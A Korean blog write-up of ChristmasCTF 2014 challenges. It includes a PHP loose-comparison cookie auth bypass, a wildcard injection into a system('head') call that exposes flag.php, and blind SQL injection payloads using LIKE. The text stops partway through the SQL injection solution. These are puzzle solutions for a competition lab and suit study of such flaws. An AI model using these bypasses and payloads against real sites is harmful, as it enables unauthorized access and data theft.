<!DOCTYPE html><html lang="ko"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>ChristmasCTF 2014 Write-up</title><meta name="description" content="Write-up of ChristmasCTF 2014."><meta name="keywords" content="christmasctf, write-up"><link rel="stylesheet" href="/assets/main.css"><link rel="canonical" href="https://yous.be/2014/12/25/christmasctf-2014-write-up/"><link rel="alternate" type="application/rss+xml" title="Yous" href="https://yous.be/atom.xml"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="icon" type="image/png" href="/icon-192x192.png"><link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="167x167" href="/apple-touch-icon-167x167.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png"><link rel="mask-icon" color="#2568ba" href="/safari-pinned-tab.svg"><meta name="msapplication-TileColor" content="#2568ba"><meta name="msapplication-TileImage" content="/mstile-144x144.png"><meta property="fb:admins" content="100001802412550"><meta property="og:title" content="ChristmasCTF 2014 Write-up"><meta property="og:site_name" content="Yous"><meta property="og:url" content="https://yous.be/2014/12/25/christmasctf-2014-write-up/"><meta property="og:description" content="Write-up of ChristmasCTF 2014."><meta property="og:image" content="http://yous.be/images/2014/12/25/christmasctf-1.png"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="ChristmasCTF 2014 Write-up"><meta name="twitter:description" content="Write-up of ChristmasCTF 2014."><meta name="twitter:image:src" content="http://yous.be/images/2014/12/25/christmasctf-1.png"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700&display=swap" rel="stylesheet"> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-43111808-1', 'auto'); ga('send', 'pageview'); </script><body><header class="site-header"><div class="wrapper"> <a class="site-title" href="/">Yous</a><nav class="site-nav"> <a class="page-link" href="/about/">About</a> <a class="page-link" href="/archives/">Archives</a></nav></div></header><main class="page-content" aria-label="Content"><div class="wrapper"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header class="post-header"><h1 class="post-title" itemprop="name headline">ChristmasCTF 2014 Write-up</h1><p class="post-meta"><time datetime="2014-12-25T15:41:26+00:00" itemprop="datePublished">Dec 25, 2014</time> • <a href="/categories/ctf/">CTF</a></p></header><div class="post-content" itemprop="articleBody"><p><img src="/images/2014/12/25/christmasctf-1.min.png" alt="ChristmasCTF" title="ChristmasCTF" /></p><ul><li><a href="#are-you-able-to-multiply">Are you able to multiply? - ALGO200</a><li><a href="#jingle-bell">JingleBell - MISC200</a><li><a href="#krystal-holic">KrystalHolic - WEB400</a><li><a href="#a-letter-to-her">A Letter To Her - WEB100</a><li><a href="#a-letter-to-her-2">A Letter To Her 2 - WEB500</a><li><a href="#weight-and-measures">WEIGHT AND MEASURES - ALGO200</a><li><a href="#php-obfuscate">PHP Obfuscate - WEB500</a><li><a href="#trace">Trace - MISC100</a></ul><h2 id="are-you-able-to-multiply">Are you able to multiply? - ALGO200</h2><blockquote><p>곱하기는 정말 어렵지 않나요?</p><p>서버 : prob2.christmasctf.com 4725</p></blockquote><p>열심히 곱셈을 하는 문제입니다.</p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n * n 의 (10 &lt;= n &lt;= 30) 격자와, 자연수 x 가 주어집니다

n * n 격자 안에서 x 개의 인접한 수들의 곱의 최대값을 구하시오(수평, 수직, 대각선, 역대각선 모두 포함)

정답 제출 방식 :

수평으로 곱이 최대값이라면, hori_곱의결과
수직으로의 곱이 최대값이라면, verti_곱의결과
대각선으로의 곱이 최대값이라면 diago_곱의결과
역대각선으로의 곱이 최대값이라면 condiago_곱의결과

정답을 위와 같은 방식으로 제출 해 주십시오

Stage (0 / 20)

03 62 13 99 80 78 15 75 21 07 41 77 47 85 58 57 36 13 79 22 59
72 69 08 52 05 50 54 58 09 02 51 15 57 73 06 63 61 44 20 92 04
46 76 62 81 95 28 22 54 20 06 40 12 12 97 71 50 05 22 64 73 05
91 33 82 19 89 62 31 87 15 76 85 34 07 16 26 57 01 50 73 68 53
17 22 69 10 16 50 08 97 40 53 69 51 87 33 62 36 80 39 01 71 42
06 46 83 13 74 15 07 05 68 51 87 70 35 19 20 86 70 07 72 67 72
91 19 64 41 48 37 88 02 08 27 14 51 08 60 72 09 69 27 32 37 09
28 52 42 44 59 21 69 08 32 42 02 92 79 37 32 37 19 88 69 39 29
84 27 31 26 60 32 83 66 72 21 87 39 50 95 13 19 95 72 98 76 38
18 06 50 28 68 58 48 44 01 47 93 44 53 27 27 98 20 42 04 57 36
99 34 88 92 90 38 77 50 55 13 33 44 49 09 22 88 70 15 23 75 05
19 20 44 79 98 04 65 45 03 30 46 31 74 47 75 70 45 95 26 93 21
91 48 42 20 81 80 74 63 34 32 06 56 41 06 79 52 81 03 26 43 21
69 80 24 04 36 04 14 42 56 31 29 92 12 40 92 88 57 33 16 83 76
33 83 63 42 35 50 42 23 92 95 48 52 81 64 49 79 15 57 26 71 92
78 39 12 72 18 98 59 97 35 95 55 35 37 49 19 93 34 11 04 81 91
22 52 84 70 09 27 83 91 84 13 81 55 82 49 43 89 13 07 37 84 94
52 29 80 39 20 22 13 95 19 71 08 76 68 94 33 53 20 70 42 93 81
79 57 76 12 51 76 62 48 79 90 62 60 46 81 98 89 96 60 28 20 63
28 25 14 24 58 01 46 59 63 87 17 54 83 55 93 94 99 36 52 19 10
79 92 48 29 80 57 53 94 66 99 09 32 37 69 56 19 42 60 76 01 47


x = 6

answer&gt;
</code></pre></div></div><p>곱합시다.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'socket'</span>

<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'prob2.christmasctf.com'</span><span class="p">,</span> <span class="mi">4725</span><span class="p">)</span>
<span class="c1"># Instruction</span>
<span class="nb">puts</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">65536</span><span class="p">)</span>

<span class="kp">loop</span> <span class="k">do</span>
  <span class="c1"># Stage</span>
  <span class="n">str</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1_000_000</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="n">str</span>
  <span class="n">matrix</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="n">str</span><span class="p">.</span><span class="nf">each_line</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
    <span class="n">matrix</span> <span class="o">&lt;&lt;</span> <span class="n">line</span><span class="p">.</span><span class="nf">chomp</span><span class="p">.</span><span class="nf">split</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:to_i</span><span class="p">)</span> <span class="k">if</span> <span class="n">line</span> <span class="o">=~</span> <span class="sr">/^\d/</span>
    <span class="n">x</span> <span class="o">=</span> <span class="vg">$1</span><span class="p">.</span><span class="nf">to_i</span> <span class="k">if</span> <span class="n">line</span> <span class="o">=~</span> <span class="sr">/x = (\d+)/</span>
  <span class="k">end</span>
  <span class="nb">puts</span> <span class="s2">"x = </span><span class="si">#{</span><span class="n">x</span><span class="si">}</span><span class="s2">"</span>

  <span class="n">hori</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="n">matrix</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">row</span><span class="o">|</span>
    <span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">row</span><span class="p">.</span><span class="nf">size</span> <span class="o">-</span> <span class="n">x</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">index</span><span class="o">|</span>
      <span class="n">tmp</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="n">index</span><span class="o">...</span><span class="n">index</span> <span class="o">+</span> <span class="n">x</span><span class="p">].</span><span class="nf">reduce</span><span class="p">(:</span><span class="o">*</span><span class="p">)</span>
      <span class="n">hori</span> <span class="o">=</span> <span class="n">tmp</span> <span class="k">if</span> <span class="n">hori</span> <span class="o">&lt;</span> <span class="n">tmp</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="n">verti</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">size</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span> <span class="o">|</span><span class="n">col_idx</span><span class="o">|</span>
    <span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">matrix</span><span class="p">.</span><span class="nf">size</span> <span class="o">-</span> <span class="n">x</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">row_idx</span><span class="o">|</span>
      <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="o">...</span><span class="n">x</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">a</span><span class="p">,</span> <span class="n">e</span><span class="o">|</span> <span class="n">a</span> <span class="o">*</span> <span class="n">matrix</span><span class="p">[</span><span class="n">row_idx</span> <span class="o">+</span> <span class="n">e</span><span class="p">][</span><span class="n">col_idx</span><span class="p">]</span> <span class="p">}</span>
      <span class="n">verti</span> <span class="o">=</span> <span class="n">tmp</span> <span class="k">if</span> <span class="n">verti</span> <span class="o">&lt;</span> <span class="n">tmp</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="n">diago</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">matrix</span><span class="p">.</span><span class="nf">size</span> <span class="o">-</span> <span class="n">x</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">row</span><span class="o">|</span>
    <span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">size</span> <span class="o">-</span> <span class="n">x</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">col</span><span class="o">|</span>
      <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="o">...</span><span class="n">x</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">a</span><span class="p">,</span> <span class="n">e</span><span class="o">|</span> <span class="n">a</span> <span class="o">*</span> <span class="n">matrix</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="n">e</span><span class="p">][</span><span class="n">col</span> <span class="o">+</span> <span class="n">e</span><span class="p">]</span> <span class="p">}</span>
      <span class="n">diago</span> <span class="o">=</span> <span class="n">tmp</span> <span class="k">if</span> <span class="n">diago</span> <span class="o">&lt;</span> <span class="n">tmp</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="n">condiago</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">matrix</span><span class="p">.</span><span class="nf">size</span> <span class="o">-</span> <span class="n">x</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">row</span><span class="o">|</span>
    <span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">size</span> <span class="o">-</span> <span class="n">x</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">col</span><span class="o">|</span>
      <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="o">...</span><span class="n">x</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">a</span><span class="p">,</span> <span class="n">e</span><span class="o">|</span> <span class="n">a</span> <span class="o">*</span> <span class="n">matrix</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="n">x</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">e</span><span class="p">][</span><span class="n">col</span> <span class="o">+</span> <span class="n">e</span><span class="p">]</span> <span class="p">}</span>
      <span class="n">condiago</span> <span class="o">=</span> <span class="n">tmp</span> <span class="k">if</span> <span class="n">condiago</span> <span class="o">&lt;</span> <span class="n">tmp</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="n">max</span> <span class="o">=</span> <span class="p">[</span><span class="n">hori</span><span class="p">,</span> <span class="n">verti</span><span class="p">,</span> <span class="n">diago</span><span class="p">,</span> <span class="n">condiago</span><span class="p">].</span><span class="nf">max</span>
  <span class="n">message</span> <span class="o">=</span> <span class="k">case</span> <span class="n">max</span>
            <span class="k">when</span> <span class="n">hori</span>
              <span class="s2">"hori_</span><span class="si">#{</span><span class="n">hori</span><span class="si">}</span><span class="s2">"</span>
            <span class="k">when</span> <span class="n">verti</span>
              <span class="s2">"verti_</span><span class="si">#{</span><span class="n">verti</span><span class="si">}</span><span class="s2">"</span>
            <span class="k">when</span> <span class="n">diago</span>
              <span class="s2">"diago_</span><span class="si">#{</span><span class="n">diago</span><span class="si">}</span><span class="s2">"</span>
            <span class="k">when</span> <span class="n">condiago</span>
              <span class="s2">"condiago_</span><span class="si">#{</span><span class="n">condiago</span><span class="si">}</span><span class="s2">"</span>
            <span class="k">end</span>
  <span class="nb">puts</span> <span class="n">message</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div><p>20 스테이지까지 통과하면 Flag를 받을 수 있습니다.</p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>크리스마스의 행복도 곱하기가 되길 바라며...


Flag is I_L0VE_S6nta, I_L0Ve_Father, I_L0VE_Y0U...
</code></pre></div></div><p>Flag는 <code class="highlighter-rouge">I_L0VE_S6nta, I_L0Ve_Father, I_L0VE_Y0U...</code>입니다.</p><h2 id="jingle-bell">JingleBell - MISC200</h2><blockquote><p>Kevin은 이번 크리스마스에 자신의 여자친구인 Margaretha에게 노래를 선물하기 위해 징글벨을 편곡했다.<br /> 악보에 숨겨진 Kevin의 메세지를 찾으시오.</p><ul><li>Authkey has to be Uppercase</ul><p><img src="/images/2014/12/25/e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg" alt="e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg" title="e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg" /></p></blockquote><p>꽤나 수상한 악보입니다. 아랫줄을 보면 박자도 맞지 않고 음도 제멋대로입니다. <a href="http://webhacking.tistory.com/6">CODEGATE 2009 예선전 Prob9</a> 문제를 참고하여 주시기 바랍니다.</p><p>마타하리라는 암호라고 하는데, 정보가 확실하진 않으나 해당 글의 WELCOME TO까지 완벽히 동일합니다. 아래 표를 보고 직접 해독합니다.</p><p><img src="/images/2014/12/25/Matahari.min.jpg" alt="Matahari" title="Matahari" /></p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WELC OME TO CHRI ST
MAS CTF PAS SIS ####
#MAT AHAR IZ ZA NG#
</code></pre></div></div><p>Flag는 <code class="highlighter-rouge">MATAHARIZZANG</code>입니다.</p><h2 id="krystal-holic">KrystalHolic - WEB400</h2><blockquote><p>http://web-prob.dkserver.wo.tc/krystalholic_1e2fdfa6874f87345dd7f27099a38668</p></blockquote><p>Board를 보면 트위터 아이디 <a href="https://twitter.com/kruby808">@kruby808</a>이 보입니다. 들어가서 트윗을 보면 좋아하는 뮤직비디오의 주소(<a href="http://www.youtube.com/watch?v=KEDCy1NA8H0">http://www.youtube.com/watch?v=KEDCy1NA8H0</a>)를 얻을 수 있습니다. 이를 이용해 <code class="highlighter-rouge">kruby808</code> 계정의 비밀번호를 찾읍시다.</p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id : kruby808
pw : th1s_IS_n0T_FL4G
</code></pre></div></div><p>로그인을 하면 Flag 메뉴에서 볼 수 있던 level이 10에서 9로 올라갔음을 알 수 있습니다. 더불어 Board 메뉴에서 관리자가 쓴 글을 읽을 수 있습니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[a-f0-9]</span><span class="si">{</span><span class="nv">32</span><span class="si">}</span><span class="s2">/"</span><span class="p">,</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session_chk'</span><span class="p">]))</span> <span class="o">||</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session_chk'</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No Cheat!'</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="s2">"dev_"</span> <span class="o">.</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session_chk'</span><span class="p">])</span> <span class="o">==</span> <span class="nb">strtolower</span><span class="p">(</span><span class="s2">"dev_"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">])))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"개발중입니다"</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session_chk'</span><span class="p">])</span> <span class="o">==</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">])))</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">];</span>

<span class="nx">login</span> <span class="nx">페이지에서</span> <span class="nx">이렇게</span> <span class="nx">자동로그인을</span> <span class="nx">구현했는데</span> <span class="nx">보안에</span> <span class="nx">문제가</span> <span class="nx">없을까요</span><span class="o">?</span> <span class="nx">ㅠㅠ</span>
</code></pre></div></div><p>일단 <code class="highlighter-rouge">$_COOKIE['session_chk']</code>는 32글자의 해시 형태가 되어야 합니다. 두 번째 조건을 보면 <code class="highlighter-rouge">$_COOKIE['session_chk']</code>가 <code class="highlighter-rouge">$_COOKIE['user_id']</code>의 MD5면 안 될 것 같은데, 세 번째 조건을 보면 또 <code class="highlighter-rouge">$_COOKIE[session_chk]</code>와 <code class="highlighter-rouge">$_COOKIE['user_id']</code>의 MD5를 검사합니다.</p><p>하지만 이 관리자는 <code class="highlighter-rouge">==</code>를 사용했습니다. PHP에서 <code class="highlighter-rouge">==</code>를 사용할 경우 양쪽 모두 문자열이더라도 한 쪽이라도 숫자처럼 보이면 양쪽 다 숫자 변환을 한 후 비교합니다.</p><p>적당히 MD5의 맨 앞 자리가 숫자가 되는 문자열을 찾습니다.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'digest/md5'</span>
<span class="no">Digest</span><span class="o">::</span><span class="no">MD5</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">(</span><span class="s1">'1aacesz'</span><span class="p">)</span>
<span class="c1"># =&gt; "1a8c7efd14576c4ebd90c2214ecea5cd"</span>
</code></pre></div></div><p>그리고 쿠키를 만들어 <code class="highlighter-rouge">user_id</code>에는 좀전의 <code class="highlighter-rouge">1aacesz</code>를, 하지만 <code class="highlighter-rouge">session_chk</code>에는 <code class="highlighter-rouge">00000000000000000000000000000001</code>을 넣습니다. 이때 두 번째 조건과 세 번째 조건은 아래와 같습니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"dev_00000000000000000000000000000001"</span> <span class="o">==</span> <span class="s2">"dev_1a8c7efd14576c4ebd90c2214ecea5cd"</span>
<span class="s2">"00000000000000000000000000000001"</span> <span class="o">==</span> <span class="s2">"1a8c7efd14576c4ebd90c2214ecea5cd"</span>
</code></pre></div></div><p>각각 거짓, 참이어서 <code class="highlighter-rouge">$_SESSION['id']</code>에 <code class="highlighter-rouge">1aacesz</code>가 들어가게 됩니다. Flag 메뉴에 들어가면 Flag를 볼 수 있습니다.</p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag:{UP_down_UP_UP_down}

Your level : Null
</code></pre></div></div><p>Flag는 <code class="highlighter-rouge">UP_down_UP_UP_down</code>입니다.</p><h2 id="a-letter-to-her">A Letter To Her - WEB100</h2><blockquote><p><a href="http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/">Link</a></p></blockquote><p>Flag 버튼을 누르면 <code class="highlighter-rouge">http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/flag.php</code>로 이동합니다. 다음과 같은 글이 보입니다.</p><blockquote><p>주석에 있지롱 ^<strong>__</strong><strong>__</strong><strong>__</strong>_____^</p></blockquote><p>이 파일의 주석을 보아야 하는 것 같습니다. 하지만 PHP 파일이라서 보이지 않는 거겠죠. 메뉴의 Clue를 봅시다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[a-zA-Z]/"</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">letter</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack"</span><span class="p">);</span>

<span class="k">elseif</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">letter</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">5</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack"</span><span class="p">);</span>

<span class="nb">system</span><span class="p">(</span><span class="s2">"head ./letter/"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">letter</span><span class="p">]);</span>
</code></pre></div></div><p>어느 페이지에서 <code class="highlighter-rouge">letter</code>를 인자로 받고 있는 것 같습니다. Letter 페이지의 Letter 1, Letter 2, Letter 3, Letter 4가 각각 다음과 같은 URL을 갖습니다.</p><ul><li><code class="highlighter-rouge">http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=1</code><li><code class="highlighter-rouge">http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=2</code><li><code class="highlighter-rouge">http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=3</code><li><code class="highlighter-rouge">http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=4</code></ul><p><code class="highlighter-rouge">?letter=</code>에 영문을 입력하지 않고 적당히 우회하면 되는 문제입니다. 정직하게 <code class="highlighter-rouge">../flag.php</code>를 쓰려니 너무 길고 이미 파일 이름에 알파벳이 포함되어 있습니다.</p><p>와일드카드를 써 봅시다. <code class="highlighter-rouge">letter</code>에 <code class="highlighter-rouge">../*</code>를 넣습니다.</p><p><code class="highlighter-rouge">http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=../*</code></p><p>소스를 봅니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">==&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">./</span><span class="nx">letter</span><span class="o">/../</span><span class="nx">css</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">==</span>

<span class="o">==&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">./</span><span class="nx">letter</span><span class="o">/../</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">==</span>
<span class="o">&lt;!--?</span><span class="nx">php</span>
<span class="cd">/********************************
*                               *
*                               *
*    Flag:{snow_is_commmming}   *
*                               *
*                               *
********************************/</span>
<span class="o">?--&gt;</span>


<span class="o">==&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">./</span><span class="nx">letter</span><span class="o">/../</span><span class="nx">images</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">==</span>

<span class="o">==&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">./</span><span class="nx">letter</span><span class="o">/../</span><span class="nx">inc</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">==</span>

<span class="o">==&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">./</span><span class="nx">letter</span><span class="o">/../</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">==</span>
<span class="o">&lt;!--?</span><span class="nx">php</span> <span class="k">include</span><span class="p">(</span><span class="s2">"inc/5f0c2baaa2c0426eed9a958e3fe0ff94.php"</span><span class="p">);</span> <span class="c1">// header ?--&gt;</span>
<span class="o">&lt;!--?</span><span class="nx">php</span> <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">==</span> <span class="s2">"photo"</span><span class="p">){</span> <span class="o">?--&gt;</span>
</code></pre></div></div><p>Flag는 <code class="highlighter-rouge">snow_is_commmming</code>입니다.</p><h2 id="a-letter-to-her-2">A Letter To Her 2 - WEB500</h2><blockquote><p><a href="http://web-prob.dkserver.wo.tc/sqli_962a035aacf08966ffc7610957ac0c29/">Link</a></p></blockquote><p>Clue를 봅시다.</p><div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nv">`table_name`</span> <span class="p">(</span>

<span class="nv">`no`</span> <span class="nb">int</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>

<span class="nv">`letter`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">COLLATE</span> <span class="s1">'utf32_unicode_ci'</span> <span class="k">NOT</span> <span class="k">NULL</span>

<span class="p">)</span>
</code></pre></div></div><p>Letter는 아까와 같지만 4번 항목만 <code class="highlighter-rouge">Secret :)</code>이라는 메시지와 함께 가려져 있습니다. 일단 괄호를 쓸 수 없습니다. 시도 끝에 like를 사용한 쿼리를 하나 만들었습니다.</p><div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">letter</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">letter</span> <span class="k">like</span> <span class="nv">"%%"</span> <span class="k">and</span> <span class="k">no</span><span class="o">=</span><span class="mi">4</span>
</code></pre></div></div><p>여기에서 4번 글의 길이를 알아낼 수 있는데요, like의 와일드카드 <code class="highlighter-rouge">_</code>를 사용하면 됩니다. 길이가 맞지 않으면 <code class="highlighter-rouge">존재하지 않는 글입니다</code> 메시지가 나오고, 길이가 맞으면 <code class="highlighter-rouge">Secret :)</code>을 볼 수 있습니다.</p><div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">letter</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">letter</span> <span class="k">like</span> <span class="nv">"_"</span> <span class="k">and</span> <span class="k">no</span><span class="o">=</span><span class="mi">4</span>
<span class="o">?</span><span class="n">letter</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">letter</span> <span class="k">like</span> <span class="nv">"__"</span> <span class="k">and</span> <span class="k">no</span><span class="o">=</span><span class="mi">4</span>
<span class="o">?</span><span class="n">letter</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">letter</span> <span class="k">like</span> <span class="nv">"___"</span> <span class="k">and</span> <span class="k">no</span><span class="o">=</span><span class="mi">4</span>
